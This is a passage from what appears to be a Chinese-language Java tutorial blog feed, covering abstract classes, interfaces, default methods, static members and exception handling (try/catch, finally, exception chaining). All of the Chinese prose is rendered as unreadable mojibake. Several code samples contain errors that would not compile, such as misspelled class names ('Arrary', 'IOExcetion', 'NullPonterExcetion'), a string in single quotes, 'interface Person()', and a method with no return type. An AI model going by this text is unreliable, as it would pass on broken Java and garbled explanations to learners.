<p>ç»§æ‰¿å¯ä»¥å…è®¸å­ç±»è¦†å†™çˆ¶ç±»çš„æ–¹æ³•ã€‚å¦‚æœä¸€ä¸ªçˆ¶ç±»ä¸å…è®¸å­ç±»å¯¹å®ƒçš„æŸä¸ªæ–¹æ³•è¿›è¡Œè¦†å†™ï¼Œå¯ä»¥æŠŠè¯¥æ–¹æ³•æ ‡è®°ä¸º<code>final</code>ï¼›å¦‚æœä¸€ä¸ªç±»ä¸å¸Œæœ›ä»»ä½•å…¶ä»–ç±»ç»§æ‰¿è‡ªå®ƒï¼Œé‚£ä¹ˆå¯ä»¥æŠŠè¿™ä¸ªç±»æœ¬èº«æ ‡è®°ä¸º<code>final</code>ï¼›å¯¹äºä¸€ä¸ªç±»çš„å®ä¾‹å­—æ®µï¼ŒåŒæ ·å¯ä»¥ç”¨<code>final</code>ä¿®é¥°ã€‚ç”¨<code>final</code>ä¿®é¥°çš„å­—æ®µåœ¨åˆå§‹åŒ–åä¸èƒ½è¢«ä¿®æ”¹ã€‚</p>
<h3 id="æŠ½è±¡ç±»">æŠ½è±¡ç±»</h3>
<p>å¦‚æœçˆ¶ç±»çš„æ–¹æ³•æœ¬èº«ä¸éœ€è¦å®ç°ä»»ä½•åŠŸèƒ½ï¼Œä»…ä»…æ˜¯ä¸ºäº†å®šä¹‰æ–¹æ³•ç­¾åï¼Œç›®çš„æ˜¯è®©å­ç±»å»è¦†å†™å®ƒï¼Œé‚£ä¹ˆï¼Œå¯ä»¥æŠŠçˆ¶ç±»çš„æ–¹æ³•å£°æ˜ä¸ºæŠ½è±¡æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¿…é¡»æŠŠ<code>Person</code>ç±»æœ¬èº«ä¹Ÿå£°æ˜ä¸º<code>abstract</code>ï¼Œæ‰èƒ½æ­£ç¡®ç¼–è¯‘å®ƒï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ— æ³•å®ä¾‹åŒ–çš„æŠ½è±¡ç±»æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</p>
<p>å› ä¸ºæŠ½è±¡ç±»æœ¬èº«è¢«è®¾è®¡æˆåªèƒ½ç”¨äºè¢«ç»§æ‰¿ï¼Œå› æ­¤ï¼ŒæŠ½è±¡ç±»å¯ä»¥å¼ºè¿«å­ç±»å®ç°å…¶å®šä¹‰çš„æŠ½è±¡æ–¹æ³•ï¼Œå¦åˆ™ç¼–è¯‘ä¼šæŠ¥é”™ã€‚å› æ­¤ï¼ŒæŠ½è±¡æ–¹æ³•å®é™…ä¸Šç›¸å½“äºå®šä¹‰äº†â€œè§„èŒƒâ€ã€‚</p>
<h3 id="æ¥å£">æ¥å£</h3>
<p>æŠ½è±¡ç±»å’Œæ¥å£çš„å¯¹æ¯”å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left">abstract class</th>
<th style="text-align:left">interface</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">ç»§æ‰¿</td>
<td style="text-align:left">åªèƒ½extendsä¸€ä¸ªclass</td>
<td style="text-align:left">å¯ä»¥implementså¤šä¸ªinterface</td>
</tr>
<tr>
<td style="text-align:left">å­—æ®µ</td>
<td style="text-align:left">å¯ä»¥å®šä¹‰å®ä¾‹å­—æ®µ</td>
<td style="text-align:left">ä¸èƒ½å®šä¹‰å®ä¾‹å­—æ®µ</td>
</tr>
<tr>
<td style="text-align:left">æŠ½è±¡æ–¹æ³•</td>
<td style="text-align:left">å¯ä»¥å®šä¹‰æŠ½è±¡æ–¹æ³•</td>
<td style="text-align:left">å¯ä»¥å®šä¹‰æŠ½è±¡æ–¹æ³•</td>
</tr>
<tr>
<td style="text-align:left">éæŠ½è±¡æ–¹æ³•</td>
<td style="text-align:left">å¯ä»¥å®šä¹‰éæŠ½è±¡æ–¹æ³•</td>
<td style="text-align:left">å¯ä»¥å®šä¹‰defaultæ–¹æ³•</td>
</tr>
</tbody>
</table>
<h4 id="defaultæ–¹æ³•">defaultæ–¹æ³•</h4>
<p>åœ¨æ¥å£ä¸­ï¼Œå¯ä»¥å®šä¹‰<code>default</code>æ–¹æ³•ã€‚ä¾‹å¦‚ï¼ŒæŠŠ<code>Person</code>æ¥å£çš„<code>run()</code>æ–¹æ³•æ”¹ä¸º<code>default</code>æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> class <span class="title">Main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Student(<span class="string">&#x27;Xiao Ming&#x27;</span>);</span><br><span class="line">        p.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span>() </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(getName() + <span class="string">&quot; run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Person</span>() </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å®ç°ç±»å¯ä»¥ä¸å¿…è¦†å†™<code>default</code>æ–¹æ³•ã€‚<code>default</code>æ–¹æ³•çš„ç›®çš„æ˜¯ï¼Œå½“æˆ‘ä»¬éœ€è¦ç»™æ¥å£æ–°å¢ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œä¼šæ¶‰åŠåˆ°ä¿®æ”¹å…¨éƒ¨å­ç±»ã€‚å¦‚æœæ–°å¢çš„æ˜¯<code>default</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå­ç±»å°±ä¸å¿…å…¨éƒ¨ä¿®æ”¹ï¼Œåªéœ€è¦åœ¨éœ€è¦è¦†å†™çš„åœ°æ–¹å»è¦†å†™æ–°å¢æ–¹æ³•ã€‚</p>
<h3 id="é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•">é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•</h3>
<h4 id="é™æ€å­—æ®µ">é™æ€å­—æ®µ</h4>
<p>é™æ€å­—æ®µå®šä¹‰ï¼š<code>static field</code></p>
<p><strong>é™æ€å­—æ®µå¹¶ä¸å±äºå®ä¾‹ï¼Œæ‰€æœ‰å®ä¾‹å…±äº«ä¸€ä¸ªé™æ€å­—æ®µï¼Œæ‰€ä»¥æ— è®ºä¿®æ”¹å“ªä¸ªå®ä¾‹çš„é™æ€å­—æ®µï¼Œæ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„ï¼šæ‰€æœ‰å®ä¾‹çš„é™æ€å­—æ®µéƒ½è¢«ä¿®æ”¹äº†ã€‚</strong></p>
<p>åœ¨ä»£ç ä¸­ï¼Œå®ä¾‹å¯¹è±¡èƒ½è®¿é—®é™æ€å­—æ®µåªæ˜¯å› ä¸ºç¼–è¯‘å™¨å¯ä»¥æ ¹æ®å®ä¾‹ç±»å‹è‡ªåŠ¨è½¬æ¢ä¸º<code>ç±»å.é™æ€å­—æ®µ</code>æ¥è®¿é—®é™æ€å¯¹è±¡ã€‚æ‰€ä»¥ï¼Œæ¨èç”¨ç±»åæ¥è®¿é—®é™æ€å­—æ®µã€‚</p>
<h4 id="é™æ€æ–¹æ³•">é™æ€æ–¹æ³•</h4>
<p>è°ƒç”¨å®ä¾‹æ–¹æ³•å¿…é¡»é€šè¿‡ä¸€ä¸ªå®ä¾‹å˜é‡ï¼Œè€Œè°ƒç”¨é™æ€æ–¹æ³•åˆ™ä¸éœ€è¦å®ä¾‹å˜é‡ï¼Œé€šè¿‡ç±»åå°±å¯ä»¥è°ƒç”¨ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Person.setNumber(<span class="number">99</span>);</span><br><span class="line">        System.out.println(Person.number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> number;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setNumber</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        number = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é™æ€æ–¹æ³•å±äºç±»è€Œä¸å±äºå®ä¾‹ï¼Œå› æ­¤ï¼Œé™æ€æ–¹æ³•å†…éƒ¨æ— æ³•è®¿é—®<code>this</code>å˜é‡ï¼Œä¹Ÿæ— æ³•è®¿é—®å®ä¾‹å­—æ®µï¼Œåªèƒ½è®¿é—®é™æ€å­—æ®µã€‚</p>
<h4 id="æ¥å£çš„é™æ€å­—æ®µ">æ¥å£çš„é™æ€å­—æ®µ</h4>
<p><code>interface</code>æ˜¯ä¸€ä¸ªçº¯æŠ½è±¡ç±»ï¼Œæ‰€ä»¥ä¸èƒ½å®šä¹‰å®ä¾‹å­—æ®µã€‚ä½†æ˜¯<code>interface</code>å¯ä»¥æœ‰é™æ€å­—æ®µï¼Œå¹¶ä¸”é™æ€å­—æ®µå¿…é¡»ä¸º<code>final</code>ç±»å‹ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MALE = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> FEMALE = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯ï¼Œ<code>interface</code>çš„å­—æ®µåªèƒ½æ˜¯<code>public static final</code>ç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠè¿™äº›ä¿®é¥°ç¬¦éƒ½å»æ‰ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åŠ ä¸Šã€‚</p>
]]></content>
      <categories>
        <category>ç¼–ç¨‹</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŸºç¡€å­¦ä¹ ä¹‹å¼‚å¸¸å¤„ç†</title>
    <url>/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h1 id="JavaåŸºç¡€å­¦ä¹ ä¹‹å¼‚å¸¸å¤„ç†">JavaåŸºç¡€å­¦ä¹ ä¹‹å¼‚å¸¸å¤„ç†</h1>
<h3 id="Javaçš„å¼‚å¸¸">Javaçš„å¼‚å¸¸</h3>
<p>Javaæ ‡å‡†åº“ä¸­å¸¸ç”¨çš„å¼‚å¸¸ï¼š</p>
<p><img src="https://i.loli.net/2019/10/12/Gz1ADtnZfLQ5cqv.png" alt=""></p>
<p>å¼‚å¸¸æ˜¯ä¸€ç§<code>class</code>ï¼Œå®ƒçš„ç»§æ‰¿å…³ç³»å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2019/10/12/xOASH6aQmposulC.png" alt=""></p>
<p><code>Throwable</code>æœ‰ä¸¤ä¸ªå­ç±»ï¼š<code>Error</code>å’Œ<code>Exception</code>ã€‚</p>
<p><code>Error</code>è¡¨ç¤ºä¸¥é‡çš„é”™è¯¯ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><code>OutOfMemoryError</code>ï¼šå†…å­˜è€—å°½</li>
<li><code>NoClassDefFountError</code>ï¼šæ— æ³•åŠ è½½æŸä¸ªClass</li>
<li><code>StackOverflowError</code>ï¼šæ ˆæº¢å‡º</li>
</ul>
<p><code>Exception</code>è¡¨ç¤ºè¿è¡Œæ—¶é”™è¯¯ï¼Œå®ƒå¯ä»¥è¢«æ•è·å¹¶å¤„ç†ã€‚</p>
<p>ç¨‹åºé€»è¾‘å¤„ç†ç›¸å…³ï¼š</p>
<ul>
<li><code>NumberFormatException</code>ï¼šæ•°å€¼ç±»å‹çš„æ ¼å¼é”™è¯¯</li>
<li><code>FileNotFoundException</code>ï¼šæœªæ‰¾åˆ°æ–‡ä»¶</li>
<li><code>SocketException</code>ï¼šè¯»å–ç½‘ç»œå¤±è´¥</li>
</ul>
<p>ä»¥åŠç¨‹åºé€»è¾‘ç¼–å†™é”™è¯¯ï¼š</p>
<ul>
<li><code>NullPointerException</code>ï¼šå¯¹æŸä¸ª<code>null</code>çš„å¯¹è±¡è°ƒç”¨æ–¹æ³•æˆ–å­—æ®µ</li>
<li><code>IndexOutOfBoundsException</code>ï¼šæ•°ç»„ç´¢å¼•è¶Šç•Œ</li>
</ul>
<p>Javaè§„å®šï¼š</p>
<ul>
<li>å¿…é¡»æ•è·çš„å¼‚å¸¸åŒ…æ‹¬ï¼š<code>Exception</code>åŠå…¶å­ç±»ï¼Œé™¤äº†<code>RuntimeExcetion</code>åŠå…¶å­ç±»ã€‚</li>
<li>ä¸éœ€è¦æ•è·çš„å¼‚å¸¸åŒ…æ‹¬ï¼š<code>Error</code>åŠå…¶å­ç±»ï¼Œ<code>RuntimeExcetion</code>åŠå…¶å­ç±»ã€‚</li>
</ul>
<h3 id="æ•è·å¼‚å¸¸">æ•è·å¼‚å¸¸</h3>
<p>æ•è·å¼‚å¸¸ä½¿ç”¨<code>try...catch</code>è¯­å¥ï¼ŒæŠŠå¯èƒ½å‘ç”Ÿå¼‚å¸¸çš„ä»£ç æ”¾åˆ°<code>try &#123;...&#125;</code>ä¸­ï¼Œç„¶åä½¿ç”¨<code>catch</code>æ•è·å¯¹åº”çš„<code>Exception</code>åŠå…¶å­ç±» ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bs = toGBK(<span class="string">&quot;ä¸­æ–‡&quot;</span>);</span><br><span class="line">        System.out.println(Arrary.toString(bs));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">byte</span>[] toGBK(String s) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> s.getBytes(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">            <span class="keyword">return</span> s.getBytes(); <span class="comment">//ä½¿ç”¨é»˜è®¤ç¼–ç </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line"><span class="comment">// [-42, -48, -50, -60]</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœæˆ‘ä»¬ä¸æ•è·<code>UnsupportedEncodingException</code>ï¼Œåˆ™ä¼šå‡ºç°ç¼–è¯‘å¤±è´¥ï¼Œè¿™æ˜¯å› ä¸º<code>String.getBytes()</code>æ–¹æ³•çš„å®šä¹‰æ˜¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] getBytes(String charsetName) <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥è°ƒç”¨æ–¹åœ¨è°ƒç”¨çš„æ—¶å€™ï¼Œå¿…é¡»å¼ºåˆ¶æ•è·è¿™äº›å¼‚å¸¸ï¼Œå¦åˆ™ç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚</p>
<h4 id="å¤šcatchè¯­å¥">å¤šcatchè¯­å¥</h4>
<p>å¯ä»¥ä½¿ç”¨å¤šä¸ª<code>catch</code>è¯­å¥ï¼Œæ¯ä¸ª<code>catch</code>æ•è·ç›¸å¯¹åº”çš„å¼‚å¸¸ï¼Œä½†æ˜¯ï¼Œ<strong>å¤šä¸ª<code>catch</code>è¯­å¥åªæœ‰ä¸€ä¸ªèƒ½è¢«æ‰§è¡Œ</strong>ã€‚æ‰€ä»¥å­˜åœ¨å¤šä¸ª<code>catch</code>æ—¶å€™ï¼Œ<code>catch</code>çš„é¡ºåºéå¸¸é‡è¦ï¼š<strong>å­ç±»å¿…é¡»å†™åœ¨å‰é¢</strong>ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOExcetion c) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;IO error&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123; <span class="comment">// æ°¸è¿œæ•è·ä¸åˆ°</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Bad encoding&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å› ä¸º<code>UnsupportedEncodingException</code>æ˜¯<code>IOExcetion</code>çš„å­ç±»ï¼Œæ‰€ä»¥å½“æŠ›å‡º<code>UnsupportedEncodingException</code>å¼‚å¸¸æ—¶ï¼Œä¼šè¢«<code>catch (IOException e) &#123; ... &#125;</code>æ•è·å¹¶æ‰§è¡Œã€‚</p>
<h4 id="finallyè¯­å¥">finallyè¯­å¥</h4>
<p>æ— è®ºæ˜¯å¦æœ‰å¼‚å¸¸å‘ç”Ÿï¼Œå¦‚æœæˆ‘ä»¬éƒ½å¸Œæœ›æ‰§è¡Œä¸€äº›è¯­å¥ï¼Œå¯ä»¥ä½¿ç”¨<code>finally</code>è¯­å¥ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        process1();</span><br><span class="line">        process2();</span><br><span class="line">        process3();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Bad encoding&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;IO error&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;END&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæŸäº›å¼‚å¸¸çš„å¤„ç†é€»è¾‘ç›¸åŒï¼Œä½†æ˜¯å¼‚å¸¸æœ¬èº«ä¸å­˜åœ¨ç»§æ‰¿å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>|</code>æ¥åˆå¹¶ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        process1();</span><br><span class="line">        process2();</span><br><span class="line">        process3();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | NumberFormatException e) &#123; <span class="comment">// IOExceptionæˆ–NumberFormatException</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Bad input&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Unknown error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æŠ›å‡ºå¼‚å¸¸">æŠ›å‡ºå¼‚å¸¸</h3>
<p>æŠ›å‡ºå¼‚å¸¸åˆ†ä¸ºä¸¤æ­¥ï¼š</p>
<ol>
<li>åˆ›å»ºæŸä¸ª<code>Excetion</code>å®ä¾‹ï¼›</li>
<li>ç”¨<code>throw</code>è¯­å¥æŠ›å‡ºã€‚</li>
</ol>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerExcetion();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="å¼‚å¸¸è½¬æ¢">å¼‚å¸¸è½¬æ¢</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process1</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        process2();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerExcetion e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentExcement;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process2</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s==<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPonterExcetion();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å½“<code>process2()</code>æŠ›å‡º<code>NullPointerException</code>åï¼Œè¢«<code>process1()</code>æ•è·ï¼Œç„¶åæŠ›å‡º<code>IllegalArgumentException()</code>ã€‚</p>
<p>å¦‚æœåœ¨<code>main()</code>ä¸­æ•è·<code>IllegalArgumentException</code>ï¼Œæˆ‘ä»¬çœ‹çœ‹æ‰“å°çš„å¼‚å¸¸æ ˆï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process1();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process2();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¼‚å¸¸æ ˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalArgumentException</span><br><span class="line">    at Main.process1(Main.java:15)</span><br><span class="line">    at Main.main(Main.java:5)</span><br><span class="line">    at java.base&#x2F;jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">    at java.base&#x2F;jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">    at java.base&#x2F;jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">    at java.base&#x2F;java.lang.reflect.Method.invoke(Method.java:567)</span><br><span class="line">    at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.execute(Main.java:415)</span><br><span class="line">    at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.run(Main.java:192)</span><br><span class="line">    at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.main(Main.java:132)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å·²ç»çœ‹ä¸åˆ°åŸå§‹å¼‚å¸¸<code>NullPointerException</code>çš„ä¿¡æ¯äº†ã€‚  ä¸ºäº†èƒ½è¿½è¸ªåˆ°å®Œæ•´çš„å¼‚å¸¸æ ˆï¼Œåœ¨æ„é€ å¼‚å¸¸çš„æ—¶å€™ï¼ŒæŠŠåŸå§‹çš„<code>Exception</code>å®ä¾‹ä¼ è¿›å»ï¼Œæ–°çš„<code>Exception</code>å°±å¯ä»¥æŒæœ‰åŸå§‹<code>Exception</code>ä¿¡æ¯ã€‚ å³ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process2();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¼‚å¸¸æ ˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: java.lang.NullPointerException</span><br><span class="line">    at Main.process1(Main.java:15)</span><br><span class="line">    at Main.main(Main.java:5)</span><br><span class="line">Caused by: java.lang.NullPointerException</span><br><span class="line">    at Main.process2(Main.java:20)</span><br><span class="line">    at Main.process1(Main.java:13)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="è‡ªå®šä¹‰å¼‚å¸¸">è‡ªå®šä¹‰å¼‚å¸¸</h3>
<p>ä¸€ä¸ªå¸¸è§çš„åšæ³•æ˜¯è‡ªå®šä¹‰ä¸€ä¸ª<code>BaseException</code>ä½œä¸ºâ€œæ ¹å¼‚å¸¸â€ï¼Œç„¶åï¼Œæ´¾ç”Ÿå‡ºå„ç§ä¸šåŠ¡ç±»å‹çš„å¼‚å¸¸ã€‚</p>
